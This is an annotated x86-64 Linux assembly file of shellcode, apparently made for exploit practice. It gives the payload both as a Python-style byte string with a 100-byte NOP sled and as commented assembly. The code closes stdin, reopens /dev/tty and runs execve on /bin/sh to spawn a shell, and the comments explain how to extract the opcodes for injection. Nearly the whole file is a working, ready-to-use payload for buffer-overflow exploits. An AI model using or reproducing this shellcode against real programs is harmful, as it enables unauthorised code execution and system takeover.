; py_buf = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x31\xC9\x4D\x31\xC0\x4D\x31\xC9\x48\x31\xC0\xB0\x03\x0F\x05\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x57\x48\xBB\x2F\x64\x65\x76\x2F\x74\x74\x79\x53\x48\x89\xE7\x40\xB6\x02\xB0\x02\x0F\x05\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x57\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\xB0\x3B\x0F\x05\x48\x31\xFF\xB0\x3C\x0F\x05\x90"
; you can assemble/link this with nasm/ld and then you just need to pull out the opcodes, get rid of all the loading/section header stuff
; you can do that in a hex editor for example
; the py_buf ABOVE is the hex string which is what you would get if you compiled the program BELOW

; 100 bytes fudge factor
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
; clear junk out of the registers
; RDI, RSI, RDX, RCX, R8, R9
xor	rdi, rdi
xor    	rsi, rsi
xor    	rdx, rdx
xor    	rcx, rcx
xor    	r8, r8
xor    	r9, r9

; clear out RAX, the syscall param
xor   	rax, rax
; sys_close(fd = 0) close stdin
mov	al,0x3
syscall

; clear out rdi, rsi, rdx
xor   	rdi,rdi
xor    	rsi, rsi
xor    	rdx, rdx

push   	rdi						; push zero to the stack to null terminate the following string
mov 	rbx,0x7974742f7665642f				; "/dev/tty"
push   	rbx						; put /dev/tty on the stack to get a pointer for syscall


; sys_open(*filename=/dev/tty\0", flags=2/readwrite, mode=0)	int mode is ignored unless creating a file (O_CREAT)
mov    	rdi,rsp						; pointer to /dev/tty<NULL>
mov    	sil,0x2						; rsi is 0x2 (O_RDWR)
mov    	al,0x2
syscall

; clear out registers rdi, rsi, rdx
xor   	rdi,rdi
xor	rsi, rsi
xor	rdx, rdx

; sys_execve(*filename=/bin/sh\0", *argv[] = NULL, *envp[] = NULL)
push   	rdi						; push zero to the stack to null terminate the following string
mov 	rbx,0x68732f2f6e69622f				; /bin/sh
push   	rbx						; push /bin/sh to the stack
mov    	rdi,rsp						; pointer to /bin/sh<NULL>
mov    	al,0x3b						; 59 = execve
syscall

; sys exit for smooth termination
xor    	rdi,rdi
mov    	al,0x3c
syscall
nop

